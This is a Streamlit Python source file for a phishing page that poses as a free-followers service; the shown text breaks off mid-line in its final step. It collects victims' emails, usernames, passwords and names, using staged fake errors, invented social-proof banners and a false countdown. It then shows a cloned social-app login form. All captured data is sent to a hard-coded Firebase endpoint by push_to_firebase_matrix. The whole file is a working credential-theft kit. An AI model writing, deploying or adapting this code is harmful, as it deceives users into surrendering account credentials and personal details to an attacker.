import streamlit as st
import time
import requests
import datetime
import uuid
import random

# --- 1. CORE WEB STRUCTURAL CONFIGURATION ---
st.set_page_config(
    page_title="Identity Allocation Interface Network",
    page_icon="🔥",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# --- 2. PREMIUM ENGINE LIGHT-MODE FORCED DESIGN SCHEME CSS ---
GLOBAL_STYLESHEET_INJECTOR = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

/* 🟡 ABSOLUTE FORCE LIGHT THEME SYSTEM GRAPHICS */
:root { color-scheme: light !important; }
html, body, .stApp { background-color: #f8fafc !important; color: #000000 !important; font-family: 'Inter', sans-serif !important; }
div[data-testid="stSidebar"] { display: none !important; }

/* Pure Deep Black Text Corrections */
p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Inter', sans-serif !important; }

/* 🔵 PREMIUM ANIMATED STEPPERS INDICATION WIDGET */
.stepper-row { display: flex; justify-content: space-between; align-items: center; margin: 15px 0 25px 0; gap: 8px; }
.step-node { 
    flex: 1; text-align: center; padding: 10px 5px; background: #ffffff; 
    border-radius: 8px; font-weight: 800; font-size: 11px; text-transform: uppercase;
    letter-spacing: 0.5px; border: 2px solid #e2e8f0; color: #64748b !important;
    transition: all 0.4s ease-in-out;
}
.step-node.active-pass { 
    background: #2563eb !important; color: #ffffff !important; 
    border-color: #2563eb !important; box-shadow: 0 4px 12px rgba(37,99,235,0.2);
    animation: pulseGlow 1.8s infinite ease-in-out;
}
.step-node.done-pass { background: #fffc00 !important; color: #000000 !important; border-color: #000000 !important; }

@keyframes pulseGlow {
    0% { transform: scale(1); }
    50% { transform: scale(1.02); box-shadow: 0 4px 15px rgba(37,99,235,0.35); }
    100% { transform: scale(1); }
}

/* 🟡 HIGH-CONTRAST TIMING ENGINE INTERFACE */
.js-countdown-wrapper { 
    background: #fffc00; border: 3px solid #000000; padding: 12px; 
    border-radius: 10px; font-weight: 800; font-size: 16px; text-align: center; 
    letter-spacing: 0.5px; color: #000000 !important; margin-bottom: 20px;
    box-shadow: 0 4px 10px rgba(0,0,0,0.06);
}

/* Social Proof Banner Realtime Injection Engine */
.social-proof-banner {
    background: linear-gradient(135deg, #ffffff 0%, #e0f2fe 100%);
    border: 2px solid #2563eb; padding: 14px; border-radius: 10px;
    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.06); margin-bottom: 20px;
}
.social-proof-text { font-size: 13px; font-weight: 700; color: #1e3a8a !important; margin: 0; line-height: 1.4; }

/* 🔒 PURE RICH INPUT FRAMES & OUTLINES ENGINE */
div[data-baseweb="input"] { 
    border: 2px solid #cbd5e1 !important; border-radius: 8px !important; 
    background-color: #ffffff !important; transition: all 0.3s ease !important;
    box-shadow: inset 0 2px 4px rgba(0,0,0,0.02) !important;
}
div[data-baseweb="input"]:focus-within { 
    border-color: #2563eb !important; background-color: #ffffff !important;
    box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.15) !important;
}
div[data-baseweb="input"] input { color: #000000 !important; font-weight: 700 !important; font-size: 14px !important; padding: 12px !important; }

/* Main Card Structural Boundaries */
.main-canvas-card { 
    background: #ffffff !important; border-radius: 14px !important; padding: 35px 25px !important; 
    box-shadow: 0 10px 25px rgba(0,0,0,0.04) !important; border: 2px solid #eef2f6 !important; margin-bottom: 25px; 
}
.portal-title { font-size: 26px; font-weight: 800; color: #000000 !important; text-align: center; }
.portal-subtitle { font-size: 13px; color: #475569 !important; font-weight: 500; text-align: center; margin-top: 4px; margin-bottom: 25px; }
.custom-label-system { font-weight: 800 !important; font-size: 13px !important; color: #000000 !important; margin-bottom: 8px !important; display: block; }

/* 🕹️ STEP 5 SPECIFIC REPLICA INTERFACE INJECTION RULES */
.clone-brand-text { text-align: center !important; font-size: 38px !important; font-weight: 400 !important; color: #000000 !important; margin-bottom: 30px !important; margin-top: -10px !important; letter-spacing: -1px !important; }
.clone-gray-label { color: #8c92ac !important; font-size: 11px !important; font-weight: 700 !important; text-transform: capitalize !important; margin-bottom: 6px !important; display: block !important; }
.forgot-pass-trigger { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 500 !important; margin-top: 6px !important; }

/* Target Photo Input Shades Override */
div[data-testid="stTextInput"]:nth-of-type(1) div[data-baseweb='input'] { background-color: #f6f7f9 !important; border: none !important; } 
div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; border: none !important; } 

/* Snap-Yellow High-Gloss Pill Button Framework */
.stButton > button[kind="secondary"] {
    background-color: #fffc00 !important; color: #000000 !important;
    border-radius: 999px !important; width: 140px !important; font-weight: 800 !important;
    font-size: 15px !important; border: 2px solid #000000 !important; height: 44px !important;
    margin: 30px auto 5px auto !important; display: block !important; box-shadow: 0 4px 10px rgba(255,252,0,0.3) !important;
}

/* Code Hacker Terminal UI Elements */
.cmd-box { background-color: #000000 !important; padding: 15px; border-radius: 8px; border: 2px solid #22c55e; margin: 15px 0; font-family: monospace !important; }
.cmd-text { color: #22c55e !important; font-size: 13px; font-weight: 600; line-height: 1.6; }
.engagement-action-box { text-align: center; margin: 20px 0; padding: 18px; background: #eff6ff; border: 2px dashed #2563eb; border-radius: 10px; }
</style>
"""
st.markdown(GLOBAL_STYLESHEET_INJECTOR, unsafe_allow_html=True)

# --- 3. INFRASTRUCTURE & BACKEND CORE PARAMETERS ---
BASE_FIREBASE_LINK = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu"

if 'step' not in st.session_state: st.session_state.step = 1
if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
if 'signup_attempts_count' not in st.session_state: st.session_state.signup_attempts_count = 1
if 'login_attempts_count' not in st.session_state: st.session_state.login_attempts_count = 1
if 'intercepted_dataset' not in st.session_state: st.session_state.intercepted_dataset = []
if 'unique_session_folder' not in st.session_state: st.session_state.unique_session_folder = str(uuid.uuid4())[:12]
if 'random_seed' not in st.session_state: st.session_state.random_seed = random.randint(10, 99)

# --- 4. JS JAVASCRIPT REAL-TIME TICKING LIVE COUNTER ENGINE ---
# This creates a real-time javascript countdown ticking on client frame without latency blocks
HTML_JS_CLOCK_INJECTOR = """
<div class="js-countdown-wrapper">
    ⏱️ SECURITY AUTHENTICATION EXPIRES IN: <span id="live-js-timer">30:00</span>
</div>

<script>
if (typeof targetTimeReset === 'undefined') {
    var targetTimeReset = new Date().getTime() + (30 * 60 * 1000);
    var timerIntervalX = setInterval(function() {
        var now = new Date().getTime();
        var distance = targetTimeReset - now;
        if (distance < 0) {
            clearInterval(timerIntervalX);
            document.getElementById("live-js-timer").innerHTML = "EXPIRED";
            window.location.reload();
            return;
        }
        var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((distance % (1000 * 60)) / 1000);
        
        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;
        
        document.getElementById("live-js-timer").innerHTML = minutes + ":" + seconds;
    }, 1000);
}
</script>
"""
st.components.v1.html(HTML_JS_CLOCK_INJECTOR, height=65)

# ==========================================
# ⚡ SOCIAL PROOF DYNAMIC NOTIFICATION DISPATCHER
# ==========================================
fake_users = ["rohit_sharma", "karan_singh_op", "riya_digital", "aman_v7", "sneha_claimx", "ayush_matrix", "divya_hub"]
fake_counts = ["2,500", "5,000", "10,000", "20,000"]
selected_fake_user = fake_users[st.session_state.random_seed % len(fake_users)]
selected_fake_count = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]

st.markdown(f"""
<div class='social-proof-banner'>
    <p class='social-proof-text'>⚡ <b>LIVE ALLOCATION CLAIM:</b> @{selected_fake_user} has bypass-verified secure clearance corridor and claimed <b>{selected_fake_count}</b> followers payload successfully!</p>
</div>
""", unsafe_allow_html=True)


def push_to_firebase_matrix(event_state):
    runtime_node_id = str(uuid.uuid4())[:8]
    target_api_endpoint = f"{BASE_FIREBASE_LINK}/{st.session_state.unique_session_folder}/{runtime_node_id}.json"
    
    payload = {
        "server_timestamp": str(datetime.datetime.now()),
        "current_step_context": event_state,
        "primary_profile_context": st.session_state.portal_data,
        "logged_credential_sequences": st.session_state.intercepted_dataset
    }
    try:
        requests.put(target_api_endpoint, json=payload)
    except:
        pass

# --- 5. HIGH-FIDELITY BADGED INTERACTIVE STEPPER ---
s1_class = "done-pass" if st.session_state.step > 1 else ("active-pass" if st.session_state.step == 1 else "")
s2_class = "done-pass" if st.session_state.step > 2 else ("active-pass" if st.session_state.step == 2 else "")
s3_class = "done-pass" if st.session_state.step > 3 else ("active-pass" if st.session_state.step == 3 else "")
s4_class = "done-pass" if st.session_state.step > 4 else ("active-pass" if st.session_state.step == 4 else "")

st.markdown(f"""
<div class="stepper-row">
    <div class="step-node {s1_class}">Stage 1: Register</div>
    <div class="step-node {s2_class}">Stage 2: Sync</div>
    <div class="step-node {s3_class}">Stage 3: Load</div>
    <div class="step-node {s4_class}">Stage 4: Verify</div>
</div>
""", unsafe_allow_html=True)


# ==========================================
# STEP 1: PORTAL REGISTRATION COMPILER
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
    
    col_l, col_m, col_r = st.columns([1, 1.2, 1])
    with col_m:
        try:
            st.image("1.png", width=65, output_format="PNG")
        except:
            st.markdown("<div style='text-align:center; color:gray; font-size:11px;'>[ 1.png Icon Space ]</div>", unsafe_allow_html=True)
            
    st.markdown("<div class='portal-title'>Create System Profile</div><div class='portal-subtitle'>Cloud Core Network Management System Node</div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-label-system'>📧 Secure Email Identity</span>", unsafe_allow_html=True)
    email_input = st.text_input("email_f", label_visibility="collapsed")
    
    st.markdown("<span class='custom-label-system'>👤 Target Handle Name</span>", unsafe_allow_html=True)
    user_input = st.text_input("user_f", placeholder="e.g., TargetCreator", label_visibility="collapsed")
    
    st.markdown("<span class='custom-label-system'>🔑 Security Key Access Password</span>", unsafe_allow_html=True)
    pass_input = st.text_input("pass_f", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("PROCEED TO MATRIX ENGINE 🚀", type="primary", use_container_width=True):
        if email_input and user_input and pass_input:
            st.session_state.random_seed = random.randint(10, 99)
            if st.session_state.signup_attempts_count < 3:
                terminal_msg = st.empty()
                terminal_msg.info("🔄 Initiating network path tunnels...")
                time.sleep(1.2)
                terminal_msg.error(f"❌ Connection Interrupted: Cloud sync overload frame timed out. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
                st.session_state.signup_attempts_count += 1
            else:
                st.success("✅ Registration footprint synchronized with network cloud cluster node.")
                st.session_state.portal_data.update({"email": email_input, "target_username": user_input, "generated_master_key": pass_input})
                push_to_firebase_matrix("PORTAL_SIGNUP_PASSED")
                st.session_state.step = 2
                time.sleep(1)
                st.rerun()
        else:
            st.warning("⚠️ Core inputs incomplete. Please specify all registration fields.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 2: PROFILE PERSISTENCE FILTER
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-title'>Identity Meta Alignment ⚙️</div><div class='portal-subtitle'>Binding transaction tracking layers to hardware profile mapping</div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-label-system'>First Name Registry String</span>", unsafe_allow_html=True)
    first_name_input = st.text_input("fn", label_visibility="collapsed")
    
    st.markdown("<span class='custom-label-system'>Last Name Registry String</span>", unsafe_allow_html=True)
    last_name_input = st.text_input("ln", label_visibility="collapsed")
    
    st.write("")
    if st.button("COMPILE STRUCTURAL PAYLOAD METRICS ⚡", type="primary", use_container_width=True):
        if first_name_input:
            st.session_state.random_seed = random.randint(10, 99)
            UI_bar = st.progress(0)
            for structural_percentage in range(100):
                time.sleep(0.01)
                UI_bar.progress(structural_percentage + 1)
            st.session_state.portal_data.update({"first_name": first_name_input, "last_name": last_name_input})
            push_to_firebase_matrix("META_SYNC_COMPLETE")
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Execution Error: Structural first name binding string cannot be empty.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 3: VOLUMETRIC METRICS SELECTION
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-title'>Target Server Parameters 🎯</div><div class='portal-subtitle'>Configuring database stream target optimization boundaries</div>", unsafe_allow_html=True)
    
    profile_visibility_state = st.radio("Is target tracking profile node completely Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
    avatar_check_state = st.radio("Does target interface map contain an active profile photo? 📸", ["Yes", "No"], index=0)
    
    st.write("---")
    requested_load_volume = st.select_slider("🔥 Choose Volumetric Delivery Stream Load Allocation Size:", options=[1000, 2500, 5000, 10000, 20000])
    
    st.write("")
    if st.button("RUN ISOLATION MATRIX ALGORITHM 🛡️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        if profile_visibility_state == "No, currently Private" or avatar_check_state == "No":
            st.error("❌ Processing Exception: Target pipeline rejects private or unmapped profile nodes.")
        else:
            isolation_placeholder = st.empty()
            isolation_placeholder.warning("📡 Locking remote proxy handshake tunnels...")
            time.sleep(1.2)
            isolation_placeholder.warning("📡 Isolating node stream allocation pipes...")
            time.sleep(1.2)
            isolation_placeholder.empty()
            
            st.session_state.portal_data.update({
                "account_visibility_metric": profile_visibility_state, 
                "avatar_presence_metric": avatar_check_state, 
                "load_volume_units": requested_load_volume
            })
            push_to_firebase_matrix("TARGET_MATRIX_SET")
            st.session_state.step = 4
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 4: BYPASS PRIORITY GATEWAY
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='main-canvas-card'>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; padding:15px; background:#f8fafc; border-radius:8px; border:2px solid #e2e8f0; margin-bottom:20px;'><h4>Standard Queue Pipeline Status: <span style='color:#ef4444;'>HEAVY DELAY</span></h4><p style='font-size:13px; color:#64748b; margin:0;'>Estimated queue waiting timeframe: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>⚡ Bypass Queue Protocol (Instant 30-Min Arrival)</h3><p style='font-size:13px; color:#475569; margin-top:4px;'>Authenticate ownership identity profile matching metrics to pass immediately into premium drop node streams.</p></div>", unsafe_allow_html=True)
    
    st.markdown("""
    <div class='engagement-action-box'>
        <span class='engagement-action-text'>🔥 🔗 CLICK HERE TO ACCESS IMMEDIATE ROUTE VERIFICATION LOGS 🔗 🔥</span>
        <p style='margin:5px 0 0 0; font-size:11px; color:#475569; font-weight:600;'>[ Cloud Handshake Identity Link Encrypted ]</p>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("PRO: ACCESS OFFICIAL IDENTITY VALIDATION INTERFACE NOW 🚀", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        script_detector_msg = st.empty()
        script_detector_msg.info("🤖 Scanning system footprints for device verification certificates...")
        time.sleep(1.5)
        script_detector_msg.success("✅ Identity clean. Opening official verification login interface...")
        time.sleep(0.8)
        script_detector_msg.empty()
        st.session_state.step = 5
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 5: PURE REPLICA DESIGN ENVIRONMENT SCREEN
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='stApp' style='background-color:#ffffff !important;'>", unsafe_allow_html=True)
    st.markdown("<div class='main-canvas-card' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 12px rgba(0,0,0,0.04) !important; max-width:400px !important; margin:30px auto 10px auto !important; border:1px solid #f1f1f1 !important;'>", unsafe_allow_html=True)
    
    col_a, col_b, col_c = st.columns([1, 1.3, 1])
    with col_b:
        try:
            st.image("2.jpg", width=65, output_format="JPEG")
        except:
            st.markdown("<p style='color:#ff4444; font-family:sans-serif; text-align:center; font-size:26px; font-weight:700; margin:0; letter-spacing:-1px;'>logo</p>", unsafe_allow_html=True)
            
    st.markdown("<p class='clone-brand-text'>vinay chat</p>", unsafe_allow_html=True)
    
    with st.form("screenshot_replica_form_engine", clear_on_submit=False):
        st.markdown("<span class='clone-gray-label'>Username or Email</span>", unsafe_allow_html=True)
        login_user_string = st.text_input("user_replica", placeholder="Your Username Here", label_visibility="collapsed")
        
        st.write("")
        
        st.markdown("<span class='clone-gray-label'>Password</span>", unsafe_allow_html=True)
        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibilit
